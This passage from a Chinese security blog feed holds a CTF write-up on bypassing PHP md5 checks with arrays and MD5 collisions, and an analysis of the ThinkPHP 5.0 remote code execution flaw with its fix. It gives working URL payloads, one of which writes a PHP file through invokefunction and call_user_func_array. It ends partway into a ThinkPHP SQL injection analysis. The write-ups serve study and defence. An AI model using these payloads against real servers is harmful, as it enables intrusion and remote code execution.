class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line"></span><br><span class="line">password = getPassword(Dictionary)</span><br><span class="line">password = getPassword(password)</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkscaoy0j30th04udg3.jpg" alt=""><br>得到解压密码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1vkug6lydj30n0052wes.jpg" alt=""></p><h1 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str8 = hash(<span class="string">'md5'</span>, $a, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$str9 = strtr(hash(<span class="string">'md5'</span>, $b, <span class="keyword">false</span>), $m, $n);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str8 : $str8&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;str9 : $str9&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">6</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"You're great,give you flag:"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>首先<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里是md5弱类型比较，可用数组来绕过<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str1<span class="string">[]</span>=<span class="number">1</span>&amp;str2<span class="string">[]</span>=<span class="number">2</span>&amp;str3<span class="string">[]</span>=<span class="number">3</span>&amp;str4<span class="string">[]</span>=<span class="number">4</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbfr0k1zj30ra0j3mxx.jpg" alt=""></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $str5 == $str6 <span class="params">||</span> $str5 == $str7 <span class="params">||</span> $str6 == $str7 )&#123;</span><br><span class="line">    die(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($str5) !== md5($str6) <span class="params">||</span> md5($str6) !== md5($str7) <span class="params">||</span> md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用了string进行强制类型转换，我们无法用数组绕过了。只能用MD5强碰撞，要求传入三个值不能相等，但是MD5相等<br>参考:<a href="https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/11/three-way-md5-collision.html</a><br>将这三个图片文件下载下来，查看md5值<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbl3nu9aj30i703tq35.jpg" alt=""><br>也可以用工具；python-md5-collision 来进行生成<br>工具下载地址:<br><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">https://github.com/thereal1024/python-md5-collision</a><br>接下来用python来提交，脚本如下:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>()</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span class="built_in">text</span></span><br></pre></td></tr></table></figure></p><p>可以看到成功饶过<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wbv9l62wj30vb0eymzk.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="number">6</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">4</span>) || (strlen($n) &gt; <span class="number">4</span>))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=1&amp;n=1"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'str5'</span>: <span class="built_in">open</span>(<span class="string">'black.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str6'</span>: <span class="built_in">open</span>(<span class="string">'brown.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'str7'</span>: <span class="built_in">open</span>(<span class="string">'white.jpg.coll'</span>).<span class="built_in">read</span>(),</span><br><span class="line">    <span class="string">'a'</span>:<span class="string">'A'</span>,</span><br><span class="line">    <span class="string">'b'</span>:<span class="number">123456</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line"><span class="built_in">print</span> r.<span class="built_in">text</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1wc5ixr3pj310y0e876l.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str8</span> = <span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$a</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$str9</span> = strtr(<span class="built_in">hash</span>(<span class="string">'md5'</span>, <span class="variable">$b</span>, <span class="literal">false</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str8 : <span class="variable">$str8</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;str9 : <span class="variable">$str9</span>&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$str8</span> == <span class="variable">$str9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (strlen(<span class="variable">$b</span>) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"You're great,give you flag:"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hash()函数讲解:<br><a href="https://www.php.net/manual/zh/function.hash.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.hash.php</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzOTM4MzEyMw==&amp;mid=2247484797&amp;idx=4&amp;sn=5b752d13d4e29ebf19c43d5d9ba91385&amp;chksm=fac80141cdbf88574c8f3fb3baf2e1174f2e002e926a801201c8f9161d7c53549d9dba658adc&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;key=93ecb28c1069103a04285feb58979315a4b1749f4add40986e8814dc225f92fdbd54fa068c158a034dea2078f082317596004f0f3aca0fc76402361b547c8e2aeb5c001bbc960c35ce4996ca738f4cc3&amp;ascene=1&amp;uin=NDI2MjY3MjY%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=KKTGRrx8UvPH7CsKG5EoBGyRNBkVrSgQ%2F97%2BsambOvw%3D</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Thinkphp 5.0远程代码执行漏洞</title>
      <link href="/2019/03/31/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/03/31/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞，</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在App.php 的run()方法中的110行<br>通过self::routerCheck函数进行路由检测<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvn5sojpj30mh06074o.jpg" alt=""><br>找到routercheck<br>thinkphp/library/think/App.php :606<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m26s7a9lj30o10djabi.jpg" alt=""><br>我们可以看到又进入$request-&gt;path()函数<br>/thinkphp/library/think/Request.php 行数:416行<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1mvsgvq85j30qx0bnq3y.jpg" alt=""><br>又进入pathinfo()函数，<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3v5wu0vj30s80fnjte.jpg" alt=""><br>Config::get(‘var_pathinfo’)是配置文件中的设置的参数，默认值为s，从GET中获取键值，然后赋值给routeCheck中的$path<br>再回到App.php，由于没有在配置文件定义任何路由，所以默认按照方式1解析调度。<br>接着调用了parseUrl()<br>在 <code>thinkphp/library/think/Route.php</code>:1208<br>从1256进行分析<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2ct1qwij30pi0dojt1.jpg" alt=""><br>可以看到解析URL的时候只是将URL按分割符分割，并没有进行安全检测。<br>其中的路由url从Request::path()中获取<br><code>/thinkphp/library/think/Request.php</code>:<br>继续往后跟<br><code>thinkphp/library/think/App.php</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3taixcwj30ou0bgjsd.jpg" alt=""></p><p>Config::get(‘var_pathinfo’)是配置文件中的设置的参数，默认值为s，从GET中获取键值，然后赋值给routeCheck中的$path<br>我们再回到App.php 行数:606<br>这里会进行路由检测，检查$check后会进入else分支导入路由配置，接着检测路由url调度结果为$result，如果调度失败且开启了强制路由$must，则报出路由无效，接着进入Route::parseUrl函数，根据$path（自定义url）解析操作<br>开始跟踪parseUrl函数<br>/thinkphp/library/think/Route.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0gfx7zkj30vj0j9ju1.jpg" alt=""><br>进入parseUrlPath函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0hzlw24j30g50fhq49.jpg" alt=""><br>对模块/控制器/操作的url地址分割成数组来返回<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0nnbj4ij30xj0hqmzn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0zo2m15j30r10e9gnb.jpg" alt=""><br>回到parseurl(),我们可以看到，返回的结果赋值为$path,提取路由信息又封装到$route,<br>最后返回,回到App.php<br>在app.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n13akbkxj30ra0hpjt9.jpg" alt=""><br>找到self::exec()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n15p5a4rj30lb0hvjte.jpg" alt=""><br>我们可以看到模块/控制器/操作 的函数为self::module<br>开始跟踪module函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n16v6mhqj30r30i8myy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n19ne3aqj30s90h5myu.jpg" alt=""><br>我们可以看到，根据$config[‘app_multi_module’]进入多模块部署，$bind为NULL，又进入elseif分支，判断模块是否在禁止的列表里面$config[‘deny_module_list’]，而且mmodule存在，$available = true，就不会抛出异常<br>module函数最后的返回值，发现$controller没有进行过滤，那么此时应该为think<code>\</code>app，也就是return self::invokeMethod($call, $vars);<br>找到invokeMethod()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1av6qjwj30wa0akq41.jpg" alt=""><br>此时穿进去的$call也就是$method,是一个数组，第一个元素是一个think\App对象，第二个元素则是调用方法名称的字符串invokefunction，然后通过反射ReflectionMethod获取这个对象下对应的方法<br>再通过函数$args = self::bindParams($reflect, $vars);获取传入的参数，也就是payload</p><p>最后再调用反射$reflect-&gt;invokeArgs($args);，将Payload数组传入反射对象函数invokeFunction，完成代码执行。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1fs4atzj30nd069dg9.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1j2g79yj30p30ft3ze.jpg" alt=""></p><p>在攻击时注意使用一个已存在的module，否则会报错 模块不存在<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2zlh5wyj30lx09b3z9.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m31aqg68j30lz0810ti.jpg" alt=""><br>此处在获取控制器名时直接从之前的解析结果中获取，无任何安全检查。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m33n1mqyj30nn094mxv.jpg" alt=""><br>这里对控制器类进行实例化<br>接着在 <code>thinkphp/library/think/Loader.php</code>：454 找到controller 方法<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m367b9n3j30q40aq0tu.jpg" alt=""><br>根据传入的name获取对应的类，如果存在就直接返回这个类的一个实例化对象。<br>跟进getModuleAndClass方法：<code>Loader.php : 521 行</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m38iewqcj30m20bvq3w.jpg" alt=""><br>如果控制器名中有<code>\</code>，就直接返回。<br>回到thinkphp/library/think/App.php的module方法，<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3fqsimfj30m60ctdgw.jpg" alt=""><br>正常情况下应该获取到对应控制器类的实例化对象，而我们现在得到了一个<code>\think\App</code>的实例化对象，进而通过url调用其任意的public方法，同时解析url中的额外参数，当作方法的参数传入。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>在thinkphp5.0版本的thinkphp/library/think/App.php554行，thinkphp5.1版本的thinkphp/library/think/route/dispatch/Url.php63行添加如下代码进行过滤：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match('/^[<span class="string">A-Za-z</span>](<span class="link">\w|\.</span>)*$/', $controller)) &#123;</span><br><span class="line"><span class="code">    throw new HttpException(404, 'controller not exists:' . $controller);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3jdum1vj30la02z74d.jpg" alt=""></p><p>payload:<br>/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=1.php&amp;vars[1][]=&lt;?php phpinfo();?&gt;</p><p>s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://paper.seebug.org/770/" target="_blank" rel="noopener">https://paper.seebug.org/770/</a><br><a href="http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a><br><a href="https://blog.51cto.com/superwolf/2338829" target="_blank" rel="noopener">https://blog.51cto.com/superwolf/2338829</a><br><a href="https://www.kancloud.cn/zmwtp/tp5/120709" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/120709</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>ThinkPHP 框架 5.0.15 SQL 注入分析</title>
      <link href="/2019/03/31/ThinkPHP-%E6%A1%86%E6%9E%B6-5-0-15-SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/31/ThinkPHP-%E6%A1%86%E6%9E%B6-5-0-15-SQL-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在thinkphp5.0.16 之前存在一个sql注入漏洞,在insert和update 方法中 传入参数可控,且无严格过滤，最终导致本次 SQL 注入漏洞发生。<br>条件:漏洞的利用是建立在thinkphp接受数组形式的参数的基础上，虽然这种写法在查询中非常少见，但是在更新、插入的时候还是有相应的需求的。</p><h1 id="环境搭建与复现"><a href="#环境搭建与复现" class="headerlink" title="环境搭建与复现"></a>环境搭建与复现</h1><p>thinkphp 官网下载 5.0.14 版本下载：<a href="http://www.thinkphp.cn/down/1107.html" target="_blank" rel="noopener">http://www.thinkphp.cn/down/1107.html</a></p><p>下载访问public目录<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1lagv6yubj30oy0c9mxv.jpg" alt=""></p><p>接下来创建数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> thinkphp;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(<span class="keyword">id</span> <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,username <span class="built_in">varchar</span>(<span 